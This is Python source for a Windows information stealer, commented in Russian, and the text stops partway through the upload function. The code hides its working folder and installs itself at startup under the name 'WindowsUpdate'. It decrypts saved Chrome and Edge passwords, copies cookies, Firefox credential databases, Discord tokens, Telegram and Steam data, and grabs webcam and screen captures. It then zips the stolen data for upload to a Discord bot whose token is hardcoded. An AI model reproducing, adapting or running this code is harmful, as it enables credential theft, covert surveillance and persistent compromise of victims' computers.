import os
import sys
import time
import datetime
import threading
import zipfile
import platform
import socket
import subprocess
import json
import winreg
import sqlite3
import shutil
import base64
import win32crypt
from PIL import ImageGrab
import requests
import psutil
import cv2
import re
import ctypes
import discord
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import pyperclip
import vdf
import random
import string

# === Генерация случайного имени, как у SHA-256 хэша ===
def generate_sha256_like_name():
    hex_chars = string.digits + 'abcdef'
    return ''.join(random.choices(hex_chars, k=64))

# === Определение имени временной папки и скрытие ===
if platform.system() == "Windows":
    TMP_DIR = generate_sha256_like_name()
else:
    TMP_DIR = "." + generate_sha256_like_name()

DISCORD_BOT_TOKEN = "MTM4OTMwMjc1MTgxNjg0MzQwNQ.GYrNV6.ofbeToaM0cCEDs-XXZN21NNXz7SA3vZWSZdl3s"  # Токен вашего Discord-бота
DISCORD_CHANNEL_ID = 1389291865668456491  # ID канала для отправки
ZIP_NAME = "temp.zip"

# === Логирование ===
def log(msg):
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    line = f"{timestamp} {msg}"
    print(line)
    try:
        log_path = os.path.join(TMP_DIR, "log.txt")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[!] Ошибка записи лога: {e}")

# === Проверка существования tmp ===
def ensure_tmp_folder():
    if os.path.exists(TMP_DIR):
        try:
            shutil.rmtree(TMP_DIR)
        except Exception as e:
            log(f"[!] Ошибка удаления старой папки: {e}")
    os.makedirs(TMP_DIR)
    log(f"[✓] Создана временная скрытая папка: {TMP_DIR}")

    if platform.system() == "Windows":
        os.system(f'attrib +H "{TMP_DIR}"')

# === Добавление в автозапуск ===
def add_to_startup(path=None):
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    if path is None:
        path = os.path.realpath(sys.argv[0])
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, path)
        log("[✓] Добавлено в автозапуск")
    except Exception as e:
        log(f"[!] Ошибка добавления в автозапуск: {e}")

# === Сбор IP ===
def save_ip_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        geolocation = requests.get(f"https://ipinfo.io/{ip}/json").json()
        geo_str = "\n".join([f"{k}: {v}" for k, v in geolocation.items()])
        with open(os.path.join(TMP_DIR, "ip.txt"), "w") as f:
            f.write(f"Public IP: {ip}\n\n=== Geolocation ===\n{geo_str}")
        log("[✓] IP сохранён в ip.txt")
    except Exception as e:
        log(f"[!] Ошибка получения IP: {e}")

# === Сбор Wi-Fi профилей ===
def save_wifi_info():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding="cp866", errors="ignore")
        with open(os.path.join(TMP_DIR, "wifi.txt"), "w", encoding="utf-8") as f:
            f.write(output)
        log("[✓] WiFi сохранён в wifi.txt")
    except Exception as e:
        log(f"[!] Ошибка WiFi: {e}")

# === Сбор информации о системе ===
def save_specs():
    try:
        cpu = platform.processor()
        ram = round(int(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES')) / (1024.**3), 2) if hasattr(os, 'sysconf') else "N/A"
        gpu = "N/A"
        os_name = platform.platform()
        # Новые данные
        system_uuid = get_system_uuid()
        disk_serial = get_disk_serial()
        with open(os.path.join(TMP_DIR, "specs.txt"), "w", encoding="utf-8") as f:
            f.write(f"CPU: {cpu}\n")
            f.write(f"RAM (GB): {ram}\n")
            f.write(f"GPU: {gpu}\n")
            f.write(f"OS: {os_name}\n")
            f.write(f"System UUID: {system_uuid}\n")
            f.write(f"Disk Serial Number: {disk_serial}\n")
            f.write("=== Routing Table ===\n")
            f.write(get_routing_table() + "\n")
            f.write("=== ARP Table ===\n")
            f.write(get_arp_table() + "\n")
            f.write("=== Windows Update Status ===\n")
            f.write(get_windows_update_status())
        log("[✓] Расширенные Specs сохранены в specs.txt")
    except Exception as e:
        log(f"[!] Ошибка сохранения расширенных Specs: {e}")

def get_windows_update_status():
    try:
        cmd = 'powershell "Get-WindowsUpdateLog"'
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
        return result[:2000]  # Берём первые 2000 символов для краткости
    except Exception as e:
        return f"[!] Ошибка получения статуса Windows Update: {e}"

def get_disk_serial():
    try:
        result = subprocess.check_output("wmic diskdrive get serialnumber", shell=True, encoding="utf-8", errors="ignore")
        lines = result.strip().splitlines()
        for line in lines:
            if "SerialNumber" not in line and line.strip():
                return line.strip()
        return "Не найден"
    except Exception as e:
        return f"[!] Ошибка получения серийного номера диска: {e}"

def get_system_uuid():
    try:
        result = subprocess.check_output("wmic csproduct get uuid", shell=True, encoding="utf-8", errors="ignore")
        lines = result.strip().splitlines()
        for line in lines:
            if "UUID" not in line and line.strip():
                return line.strip()
        return "Не найден"
    except Exception as e:
        return f"[!] Ошибка получения UUID: {e}"

def get_arp_table():
    try:
        result = subprocess.check_output("arp -a", shell=True, encoding="cp866", errors="ignore")
        return result
    except Exception as e:
        return f"[!] Ошибка получения ARP таблицы: {e}"

def get_routing_table():
    try:
        result = subprocess.check_output("route print", shell=True, encoding="cp866", errors="ignore")
        return result
    except Exception as e:
        return f"[!] Ошибка получения таблицы маршрутизации: {e}"

# === Сбор MAC-адресов ===
def save_mac_addresses():
    try:
        result = subprocess.check_output("getmac", shell=True, encoding="cp866", errors="ignore")
        with open(os.path.join(TMP_DIR, "mac_addresses.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] MAC-адреса сохранены в mac_addresses.txt")
    except Exception as e:
        log(f"[!] Ошибка сбора MAC-адресов: {e}")

def save_mac_addresse():
    try:
        result = subprocess.check_output("getmac", shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="replace")
        with open(os.path.join(TMP_DIR, "mac_addresse.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] MAC-адреса сохранены в mac_addresse.txt")
    except Exception as e:
        log(f"[!] Ошибка сбора MAC-адресов: {e}")

# === Сбор списка установленных программ ===
def save_installed_programs():
    try:
        programs = []
        for reg_key in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for path in [
                r"Software\Microsoft\Windows\CurrentVersion\Uninstall",
                r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]:
                try:
                    key = winreg.OpenKey(reg_key, path)
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                programs.append(name)
                            except FileNotFoundError:
                                pass
                            i += 1
                        except OSError:
                            break
                except FileNotFoundError:
                    continue
        with open(os.path.join(TMP_DIR, "installed_programs.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(programs))
        log("[✓] Установленные программы сохранены")
    except Exception as e:
        log(f"[!] Ошибка сбора программ: {e}")

# === Telegram, Steam, Discord ===
def save_discord_user():
    discord_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(discord_path):
        log("[!] Discord не установлен")
        return
    tokens = []
    try:
        for file in os.listdir(discord_path):
            if file.endswith(".log") or file.endswith(".ldb"):
                try:
                    with open(os.path.join(discord_path, file), "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\]][^\"]*", content)
                        tokens.extend(matches)
                except Exception:
                    continue
        if tokens:
            with open(os.path.join(TMP_DIR, "discord_user.txt"), "w", encoding="utf-8") as f:
                for token in tokens:
                    decoded = base64.b64decode(token.split(":")[2])
                    f.write(f"Raw Token: {token}\nDecoded Part: {decoded[:30]}...\n---\n")
            log("[✓] Discord токены сохранены в discord_user.txt")
        else:
            log("[!] Токены Discord не найдены")
    except Exception as e:
        log(f"[!] Ошибка получения Discord пользователя: {e}")

def save_telegram_data():
    tg_dir = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    if not os.path.exists(tg_dir):
        log("[!] Telegram не установлен")
        return
    try:
        # Поиск файлов сессий
        session_files = [f for f in os.listdir(tg_dir) if f.endswith(".session")]
        user_info = []
        for sess_file in session_files:
            with open(os.path.join(tg_dir, sess_file), "rb") as f:
                content = f.read().decode(errors="ignore")
                # Пример поиска ID и никнейма
                telegram_id = re.search(r"(\d{5,15})", content)
                username = re.search(r"@([A-Za-z0-9_]{5,32})", content)
                user_info.append(f"Telegram ID: {telegram_id.group(1) if telegram_id else 'Не найден'}\n"
                                 f"Username: @{username.group(1) if username else 'Не найден'}\n---\n")
        with open(os.path.join(TMP_DIR, "telegram_users.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(user_info))
        log("[✓] Telegram данные сохранены в telegram_users.txt")
    except Exception as e:
        log(f"[!] Ошибка сохранения Telegram данных: {e}")

def save_steam_date():
    steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
    if not os.path.exists(steam_path):
        log("[!] Steam не установлен")
        return
    try:
        with open(steam_path, "r", encoding="utf-8") as f:
            data = f.read()
        # Извлечение Steam ID и никнеймов
        pattern = r'"(\d+)"\s*{\s*[^}]*?"PersonaName"\s*"([^"]+)"'
        matches = re.findall(pattern, data)
        with open(os.path.join(TMP_DIR, "steam_users.txt"), "w", encoding="utf-8") as f:
            for steam_id, name in matches:
                f.write(f"Steam ID: {steam_id}\nNickname: {name}\n---\n")
        log("[✓] Steam пользователи сохранены в steam_users.txt")
    except Exception as e:
        log(f"[!] Ошибка сохранения Steam данных: {e}")

def extract_telegram_nickname():
    roaming = os.getenv("APPDATA")
    tdata_path = os.path.join(roaming, "Telegram Desktop", "tdata")
    if not os.path.exists(tdata_path):
        log("[!] Telegram не установлен")
        return
    try:
        nickname_file = None
        for file in os.listdir(tdata_path):
            if re.match(r"D877F783D5D3EEB00FECE6AC132A6475$", file):
                nickname_file = os.path.join(tdata_path, file)
                break
        if not nickname_file:
            log("[!] Файл с ником Telegram не найден")
            return
        with open(nickname_file, "rb") as f:
            content = f.read().decode(errors="ignore")
        nickname_match = re.search(r"@([A-Za-z0-9_]{3,32})", content)
        telegram_id_match = re.search(r"user#id=(\d+)", content)
        nickname = nickname_match.group(1) if nickname_match else "Не найден"
        telegram_id = telegram_id_match.group(1) if telegram_id_match else "Не найден"
        with open(os.path.join(TMP_DIR, "telegram_nickname.txt"), "w", encoding="utf-8") as f:
            f.write(f"Telegram ID: {telegram_id}\nNickname: @{nickname}\n")
        log("[✓] Telegram никнейм сохранён в telegram_nickname.txt")
    except Exception as e:
        log(f"[!] Ошибка при извлечении никнейма Telegram: {e}")

# === Сбор запущенных процессов ===
def save_running_processes():
    try:
        processes = [f"{p.pid} — {p.name()}" for p in psutil.process_iter()]
        with open(os.path.join(TMP_DIR, "running_processes.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(processes))
        log("[✓] Запущенные процессы сохранены")
    except Exception as e:
        log(f"[!] Ошибка сбора процессов: {e}")

# === Сбор истории подключения USB ===
def save_usb_history():
    try:
        cmd = "powershell Get-WinEvent -LogName Microsoft-Windows-DriverFrameworks-UserMode/Operational | Where-Object {$_.Id -eq 2003}"
        result = subprocess.check_output(
            cmd,
            shell=True,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="ignore"
        )
        with open(os.path.join(TMP_DIR, "usb_history.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] История USB устройств сохранена")
    except Exception as e:
        log(f"[!] Ошибка сбора USB истории: {e}")

# === Сбор истории поиска в проводнике ===
def save_search_history():
    try:
        search_dir = os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Windows", "History")
        history_file = os.path.join(TMP_DIR, "search_history.txt")
        if os.path.exists(search_dir):
            with open(history_file, "w", encoding="utf-8") as f:
                for root, dirs, files in os.walk(search_dir):
                    for file in files:
                        f.write(os.path.join(root, file) + "\n")
            log("[✓] История поиска в проводнике сохранена")
        else:
            log("[!] История поиска не найдена")
    except Exception as e:
        log(f"[!] Ошибка сбора истории поиска: {e}")

# === Сбор закладок браузеров ===
def save_browser_bookmarks():
    def read_chrome_bookmarks():
        bookmark_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Bookmarks")
        if os.path.exists(bookmark_path):
            with open(bookmark_path, "r", encoding="utf-8") as f:
                return f.read()
        return ""

    def read_edge_bookmarks():
        bookmark_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Bookmarks")
        if os.path.exists(bookmark_path):
            with open(bookmark_path, "r", encoding="utf-8") as f:
                return f.read()
        return ""

    def read_firefox_bookmarks():
        profile_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if os.path.exists(profile_path):
            for folder in os.listdir(profile_path):
                prof_dir = os.path.join(profile_path, folder)
                if os.path.isdir(prof_dir):
                    places_sqlite = os.path.join(prof_dir, "places.sqlite")
                    if os.path.exists(places_sqlite):
                        tmp_db = os.path.join(TMP_DIR, "firefox_places_copy")
                        shutil.copy2(places_sqlite, tmp_db)
                        conn = sqlite3.connect(tmp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title FROM moz_places WHERE hidden=0")
                        res = "\n".join([f"{url} — {title}" for url, title in cursor.fetchall()])
                        conn.close()
                        os.remove(tmp_db)
                        return res
        return ""

    chrome = read_chrome_bookmarks()
    edge = read_edge_bookmarks()
    firefox = read_firefox_bookmarks()
    with open(os.path.join(TMP_DIR, "bookmarks.txt"), "w", encoding="utf-8") as f:
        f.write("=== Chrome ===\n")
        f.write(chrome + "\n")
        f.write("=== Edge ===\n")
        f.write(edge + "\n")
        f.write("=== Firefox ===\n")
        f.write(firefox)
    log("[✓] Закладки браузеров сохранены")

# === Сбор открытых портов ===
def save_open_ports():
    try:
        ports = []
        for conn in psutil.net_connections():
            if conn.status == "LISTEN":
                ports.append(f"{conn.laddr.ip}:{conn.laddr.port}")
        with open(os.path.join(TMP_DIR, "open_ports.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(ports))
        log("[✓] Открытые порты сохранены")
    except Exception as e:
        log(f"[!] Ошибка сбора портов: {e}")

def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            log("[!] Камера не доступна")
            return
        ret, frame = cam.read()
        if ret:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(TMP_DIR, f"webcam_{timestamp}.jpg")
            cv2.imwrite(path, frame)
            log(f"[✓] Скриншот сохранен: {path}")
        cam.release()
    except Exception as e:
        log(f"[!] Ошибка: {e}")

# === Сбор DNS кэша ===
def save_dns_cache():
    try:
        result = subprocess.check_output("ipconfig /displaydns", shell=True, encoding="cp866")
        with open(os.path.join(TMP_DIR, "dns_cache.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] DNS кэш сохранён")
    except Exception as e:
        log(f"[!] Ошибка сбора DNS кэша: {e}")

# === Расшифровка паролей Chrome ===
def decrypt_chrome_password(encrypted_password):
    try:
        if sys.platform == 'win32':
            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        else:
            return "Unsupported OS for decrypt"
    except Exception as e:
        return f"Ошибка decrypt: {e}"

def save_env():
    try:
        env_vars = os.environ
        with open(os.path.join(TMP_DIR, "env.txt"), "w", encoding="utf-8") as f:
            for k, v in env_vars.items():
                f.write(f"{k}={v}\n")
        log("[✓] Environment vars сохранены в env.txt")
    except Exception as e:
        log(f"[!] Ошибка Environment vars: {e}")

def save_chrome_passwords():
    local_app_data = os.getenv("LOCALAPPDATA")
    login_db_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_db_path):
        log("[!] Chrome: файл паролей не найден")
        return
    tmp_db = os.path.join(TMP_DIR, "ChromeLoginData_copy")
    try:
        shutil.copy2(login_db_path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for origin_url, username, password_enc in cursor.fetchall():
            password = decrypt_chrome_password(password_enc)
            passwords.append(f"URL: {origin_url}\nUser: {username}\nPass: {password}\n---\n")
        conn.close()
        os.remove(tmp_db)
        with open(os.path.join(TMP_DIR, "chrome_passwords.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(passwords))
        log("[✓] Chrome пароли сохранены в chrome_passwords.txt")
    except Exception as e:
        log(f"[!] Ошибка сохранения Chrome паролей: {e}")

def save_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, path, 0, winreg.KEY_READ) as reg_key:
            startup_items = []
            i = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(reg_key, i)
                    startup_items.append(f"{name}: {val}")
                    i += 1
                except OSError:
                    break
        with open(os.path.join(TMP_DIR, "startup.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(startup_items))
        log("[✓] Autostart сохранён в startup.txt")
    except Exception as e:
        log(f"[!] Ошибка Autostart: {e}")

def capture_screenshot():
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        img = ImageGrab.grab()
        path = os.path.join(TMP_DIR, f"screenshot_{timestamp}.png")
        img.save(path, "PNG")
        log(f"[✓] Скриншот сохранён: {path}")
    except Exception as e:
        log(f"[!] Ошибка скриншота: {e}")

def save_browsers():
    try:
        browsers = []
        if os.path.exists(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe") or os.path.exists(r"C:\Program Files\Google\Chrome\Application\chrome.exe"):
            browsers.append("Google Chrome")
        if os.path.exists(r"C:\Program Files\Mozilla Firefox\firefox.exe"):
            browsers.append("Mozilla Firefox")
        if os.path.exists(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe") or os.path.exists(r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"):
            browsers.append("Microsoft Edge")
        with open(os.path.join(TMP_DIR, "browsers.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(browsers) + "\n")
        log("[✓] Browsers сохранены в browsers.txt")
    except Exception as e:
        log(f"[!] Ошибка Browsers: {e}")

def save_firefox_files():
    appdata_roaming = os.getenv("APPDATA")
    ff_profile_path = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(ff_profile_path):
        log("[!] Firefox профили не найдены")
        return
    try:
        profiles = [p for p in os.listdir(ff_profile_path) if os.path.isdir(os.path.join(ff_profile_path, p))]
        if not profiles:
            log("[!] Профили не найдены")
            return
        profile_dir = os.path.join(ff_profile_path, profiles[0])
        # Скопируем файлы key4.db и logins.json для паролей
        files_to_copy = ["logins.json", "key4.db", "cookies.sqlite"]
        for filename in files_to_copy:
            src = os.path.join(profile_dir, filename)
            if os.path.exists(src):
                dst = os.path.join(TMP_DIR, f"firefox_{filename}")
                shutil.copy2(src, dst)
                log(f"[✓] Файл скопирован: {filename}")
    except Exception as e:
        log(f"[!] Ошибка сохранения Firefox файлов: {e}")

def save_chrome_cookie():
    local_app_data = os.getenv("LOCALAPPDATA")
    cookie_db_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Cookies")
    if not os.path.exists(cookie_db_path):
        log("[!] Chrome: файл куки не найден")
        return
    tmp_db = os.path.join(TMP_DIR, "ChromeCookies_copy")
    try:
        shutil.copy2(cookie_db_path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 1000")
        cookies = []
        for host, name, encrypted_value in cursor.fetchall():
            # Расшифровка куки не реализована - запишем в base64 для инфы
            cookies.append(f"Host: {host}\nName: {name}\nEncryptedValueBase64: {base64.b64encode(encrypted_value).decode()}\n---\n")
        conn.close()
        os.remove(tmp_db)
        with open(os.path.join(TMP_DIR, "chrome_cookies.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(cookies))
        log("[✓] Chrome cookies сохранены в chrome_cookies.txt")
    except Exception as e:
        log(f"[!] Ошибка сохранения Chrome cookies: {e}")

def save_edge_passwords_and_cookies():
    local_app_data = os.getenv("LOCALAPPDATA")
    edge_login_db = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Login Data")
    edge_cookie_db = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cookies")
    # Пароли
    if os.path.exists(edge_login_db):
        tmp_db = os.path.join(TMP_DIR, "EdgeLoginData_copy")
        try:
            shutil.copy2(edge_login_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            for origin_url, username, password_enc in cursor.fetchall():
                password = decrypt_chrome_password(password_enc)
                passwords.append(f"URL: {origin_url}\nUser: {username}\nPass: {password}\n---\n")
            conn.close()
            os.remove(tmp_db)
            with open(os.path.join(TMP_DIR, "edge_passwords.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(passwords))
            log("[✓] Edge сохранен в edge_passwords.txt")
        except Exception as e:
            log(f"[!] Ошибка сохранения Edge: {e}")
    else:
        log("[!] Edge не найден")

    # Cookies
    if os.path.exists(edge_cookie_db):
        tmp_db = os.path.join(TMP_DIR, "EdgeCookies_copy")
        try:
            shutil.copy2(edge_cookie_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 1000")
            cookies = []
            for host, name, encrypted_value in cursor.fetchall():
                cookies.append(f"Host: {host}\nName: {name}\nEncryptedValueBase64: {base64.b64encode(encrypted_value).decode()}\n---\n")
            conn.close()
            os.remove(tmp_db)
            with open(os.path.join(TMP_DIR, "edge_cookies.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(cookies))
            log("[✓] Edge cookies сохранены в edge_cookies.txt")
        except Exception as e:
            log(f"[!] Ошибка сохранения Edge cookies: {e}")
    else:
        log("[!] Edge cookies не найдены")

def save_files_list():
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        files = []
        for folder in [desktop, downloads]:
            if os.path.exists(folder):
                files.extend(os.listdir(folder))
        with open(os.path.join(TMP_DIR, "files.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(files))
        log("[✓] Files list сохранён в files.txt")
    except Exception as e:
        log(f"[!] Ошибка Files list: {e}")

def save_browser_history():
    # Chrome history
    try:
        local_app_data = os.getenv("LOCALAPPDATA")
        history_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\History")
        if os.path.exists(history_path):
            tmp_db = os.path.join(TMP_DIR, "ChromeHistory_copy")
            shutil.copy2(history_path, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            entries = [f"URL: {url}\nTitle: {title}\n---\n" for url, title in cursor.fetchall()]
            conn.close()
            os.remove(tmp_db)
            with open(os.path.join(TMP_DIR, "history.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(entries))
            log("[✓] История записана")
    except Exception as e:
        log(f"[!] Ошибка сохранения истории: {e}")

def collect_screenshots():
    try:
        screens_dir = os.path.join(TMP_DIR, "screens")
        if not os.path.exists(screens_dir):
            os.makedirs(screens_dir)
        screenshots_path = os.path.join(os.path.expanduser("~"), "Pictures", "Screenshots")
        if not os.path.exists(screenshots_path):
            log("[!] Папка скриншотов не найдена")
            return
        count = 0
        for file in os.listdir(screenshots_path):
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp')):
                src = os.path.join(screenshots_path, file)
                dst = os.path.join(screens_dir, file)
                shutil.copy2(src, dst)
                count += 1
        log(f"[✓] Скопировано {count} скриншотов в {screens_dir}")
    except Exception as e:
        log(f"[!] Ошибка сбора скриншотов: {e}")

# === Сбор данных Discord ===
def save_discord_data():
    discord_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(discord_path):
        log("[!] Discord не установлен")
        return
    tokens = []
    for file in os.listdir(discord_path):
        if file.endswith(".log") or file.endswith(".ldb"):
            try:
                with open(os.path.join(discord_path, file), "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\]][^\"]*", content)
                    tokens.extend(matches)
            except Exception:
                continue
    with open(os.path.join(TMP_DIR, "discord_tokens.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(tokens))
    log("[✓] Discord токены сохранены")

# === Сбор Steam данных ===
def save_steam_data():
    steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
    if not os.path.exists(steam_path):
        log("[!] Steam не установлен")
        return
    with open(steam_path, "r", encoding="utf-8") as f:
        data = f.read()
    with open(os.path.join(TMP_DIR, "steam_logins.txt"), "w", encoding="utf-8") as f:
        f.write(data)
    log("[✓] Steam данные сохранены")

def save_windows_product_key():
    try:
        wmi = subprocess.check_output(
            "wmic path softwarelicensingservice get OA3xOriginalProductKey",
            shell=True,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="ignore"
        )
        product_key = wmi.strip().replace("OA3xOriginalProductKey", "").strip()
        if product_key:
            with open(os.path.join(TMP_DIR, "windows_key.txt"), "w", encoding="utf-8") as f:
                f.write(product_key)
            log("[✓] Ключ Windows сохранён в windows_key.txt")
        else:
            log("[!] Ключ Windows не найден (возможно, он отсутствует или система не активирована)")
    except Exception as e:
        log(f"[!] Ошибка получения ключа Windows: {e}")

def save_cmd_history():
    try:
        history_path = os.path.join(os.getenv("APPDATA"), "..", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        if os.path.exists(history_path):
            shutil.copy2(history_path, os.path.join(TMP_DIR, "cmd_history.txt"))
            log("[✓] История PowerShell сохранена")
        else:
            log("[!] История PowerShell не найдена")
    except Exception as e:
        log(f"[!] Ошибка получения истории команд: {e}")

def save_antivirus_info():
    try:
        antivirus_list = []
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    with winreg.OpenKey(key, subkey_name) as subkey:
                        try:
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            if "antivirus" in display_name.lower() or "security" in display_name.lower():
                                antivirus_list.append(display_name)
                        except FileNotFoundError:
                            pass
                    i += 1
                except OSError:
                    break
        if "Windows Defender" not in antivirus_list:
            try:
                result = subprocess.check_output("powershell Get-MpPreference", shell=True, stderr=subprocess.STDOUT, encoding="utf-8")
                if "DisableRealtimeMonitoring" in result and "0" in result:
                    antivirus_list.append("Windows Defender (активен)")
                else:
                    antivirus_list.append("Windows Defender (отключен)")
            except Exception:
                pass
        with open(os.path.join(TMP_DIR, "antivirus_info.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(antivirus_list))
        log("[✓] Информация об антивирусах сохранена")
    except Exception as e:
        log(f"[!] Ошибка получения информации об антивирусах: {e}")

def cleanup_temp_folder():
    try:
        for file in os.listdir(TMP_DIR):
            file_path = os.path.join(TMP_DIR, file)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                log(f"[!] Ошибка очистки %TEMP%: {e}")
        log("[✓] Папка %TEMP% очищена")
    except Exception as e:
        log(f"[!] Ошибка очистки временной папки: {e}")

def save_disk_info():
    try:
        partitions = psutil.disk_partitions()
        disk_info = []
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info.append(f"Device: {partition.device}\n"
                                  f"Mountpoint: {partition.mountpoint}\n"
                                  f"File system type: {partition.fstype}\n"
                                  f"Total Size: {usage.total / (1024**3):.2f} GB\n"
                                  f"Free Space: {usage.free / (1024**3):.2f} GB\n"
                                  f"---\n")
            except PermissionError:
                continue
        with open(os.path.join(TMP_DIR, "disk_info.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(disk_info))
        log("[✓] Информация о дисках сохранена")
    except Exception as e:
        log(f"[!] Ошибка получения информации о дисках: {e}")

def save_last_reboot_time():
    try:
        boot_time = psutil.boot_time()
        last_reboot = datetime.datetime.fromtimestamp(boot_time).strftime("%Y-%m-%d %H:%M:%S")
        with open(os.path.join(TMP_DIR, "last_reboot.txt"), "w") as f:
            f.write(f"Last Reboot Time: {last_reboot}")
        log("[✓] Время последней перезагрузки сохранено")
    except Exception as e:
        log(f"[!] Ошибка получения времени перезагрузки: {e}")

# === Архивация и отправка в Discord ===
def create_zip():
    try:
        zip_path = os.path.join(TMP_DIR, ZIP_NAME)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(TMP_DIR):
                for file in files:
                    if file == ZIP_NAME:
                        continue
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, TMP_DIR)
                    zipf.write(file_path, arcname)
        log(f"[✓] Архив создан: {zip_path}")
    except Exception as e:
        log(f"[!] Ошибка создания архива: {e}")

def send_zip_to_discord_bot():
    try:
        zip_path = os.path.join(TMP_DIR, ZIP_NAME)
        class DiscordBot(discord.Client):
            async def on_ready(self):
